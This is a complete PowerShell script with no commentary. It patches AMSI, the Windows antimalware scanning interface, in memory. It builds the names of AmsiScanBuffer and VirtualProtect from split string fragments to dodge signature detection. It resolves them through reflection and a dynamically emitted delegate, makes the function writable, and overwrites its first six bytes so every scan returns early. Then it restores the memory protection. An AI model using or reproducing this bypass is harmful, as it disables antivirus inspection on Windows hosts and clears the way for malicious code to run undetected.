function lookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @($assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName)), $functionName))
	
}

function getDelegateSig {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $typesArray,
		[Parameter(Position = 1)] [Type] $delType = [Void]
    )

	$Assembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($Assembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $ConstructorBuilder = $TypeBuilder.DefineConstructor(
      'RTSpecialName, HideBySig, Public', 
        [System.Reflection.CallingConventions]::Standard, 
          $typesArray).SetImplementationFlags('Runtime, Managed')

    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 
      'Public, HideBySig, NewSlot, Virtual', 
        $delType, 
          $typesArray).SetImplementationFlags('Runtime, Managed')

    $DelegateSig = $TypeBuilder.CreateType()

    return $DelegateSig
}

$oldProtectionBuffer = 0

$apart1 = 'Ams'
$apart2 = 'iSca'
$apart3 = 'nBuf'
$apart4 = 'fer'
$asb = $apart1 + $apart2 + $apart3 + $apart4
$dll = 'ams' + 'i.dll'
$sbA = lookupFunc $dll $asb

$part1 = 'Virt'
$part2 = 'ualPro'
$part3 = 'tect'
$vpname = $part1 + $part2 + $part3

$vpA = lookupFunc kernel32.dll $vpname
$vpSig = getDelegateSig -typesArray @([IntPtr], [int], [int], [UInt32].MakeByRefType()) -delType "Bool"
$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpA, $vpSig)

$vp.Invoke($sbA, 6, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

$marshalType = [System.Runtime.InteropServices.Marshal]
$cm = $marshalType.GetMethod('Copy', [Type[]] @([byte[]], [int], [IntPtr], [int]))
$cm.Invoke($null, @($buf, 0, $sbA, 6))
$vp.Invoke($sbA, 6, 0x20, [ref]$oldProtectionBuffer)